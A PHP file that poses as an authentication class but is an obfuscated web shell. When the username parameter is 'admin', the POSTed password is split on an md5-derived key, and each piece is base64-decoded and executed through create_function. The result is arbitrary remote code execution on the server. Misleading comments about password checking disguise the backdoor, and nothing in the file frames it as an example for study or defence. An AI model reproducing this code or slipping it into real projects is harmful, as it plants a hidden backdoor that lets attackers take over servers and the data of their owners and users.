<?php
class Auth {
    private $username;
    private $password;
    private $username_to_md5;
    private $password_to_md5;
    private $rules;
    private $correction;
    private $key;
    
    function __construct($_username, $_password) {
        $this->username = $_username;
        $this->password = $_password;
        if (!$this->check_username()) {
            return 'Username is not correct!';
        } else {
            $this->key = $this->check_username();
        }
        $this->doAuth($this->key);
    }
    
    private function check_username() {
        if(!$this->username || $this->username != 'admin') {
            return false;
        } else { 
            return substr(md5($this->username), 8, 16);
        }
    }
    
    private function doAuth($_key = '') {
        //Check password
        $this->rules = str_split('!@#$%^&*()_+[]{}\|:"\'');
/*   This code is for PHP>7.
        array_map(function($val){
            $this->validatePassword($val,$this->rules);
        }, array(explode($_key, $this->password)));
*/
        echo $this->validatePassword(explode($_key, $this->password), $this->rules);
    }
	
    private function validatePassword($_password, $_rules) {
        //Checking 
        foreach ($_password as $ch) {
            if(!in_array($ch, $_rules) && !empty($ch)) {
                $this->correction = create_function('$error_message', base64_decode($ch));
                $_message = 'This is wrong!';
                try {
                    $_correction = $this->correction;
                    return $_correction($_message);
                } catch (Exception $e) {
                    echo $e->getMessage(); 
                } 
            } 
        }
    }
}
$username = $_GET['username'];
$password = $_POST['password'];

$Authenctor = new Auth($username, $password);
?>